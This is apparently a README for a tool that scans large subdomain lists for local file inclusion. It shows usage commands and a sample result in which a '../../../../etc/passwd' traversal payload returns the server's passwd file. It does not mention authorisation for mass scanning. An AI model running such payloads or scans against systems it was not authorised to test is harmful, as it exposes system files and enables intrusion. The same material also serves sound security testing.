# lfi_scanner
## **Installation & Usage:**

```bash
# Install required package
pip install aiohttp

# For huge lists (>10k subdomains) - FAST MODE
python3 fast_lfi_scanner.py all_subs.txt

# For more comprehensive testing
python3 lfi_scanner.py -i all_subs.txt

# With high concurrency for speed
python3 lfi_scanner.py -i all_subs.txt -w 200

# Limit to first 5000 subdomains
python3 lfi_scanner.py -i all_subs.txt --limit 5000
```

## **Key Features:**

1. **Ultra-Fast Scanning**: Optimized for huge lists with high concurrency
2. **Smart Payload Selection**: Only tests most effective payloads first
3. **Quick Detection**: Uses pattern matching for /etc/passwd and common errors
4. **Clean Output**: Results are clearly formatted in text file
5. **JSON Export**: Also exports results in JSON for further processing
6. **Confidence Levels**: Classifies findings as HIGH/MEDIUM confidence

## **Output Format:**
```
========================================
LFI VULNERABILITY SCAN RESULTS
========================================

Scan Date: 2024-01-15 10:30:45
Total Subdomains Scanned: 50000
Vulnerabilities Found: 3
========================================

[1] vulnerable.example.com
    URL: http://vulnerable.example.com/?file=../../../../etc/passwd
    Payload: ../../../../etc/passwd
    Status: 200
    File Type: passwd
    Confidence: HIGH
    Evidence:
      root:x:0:0:root:/root:/bin/bash
      daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

This tool will quickly scan through your huge list and give you clean, actionable results with minimal false positives!
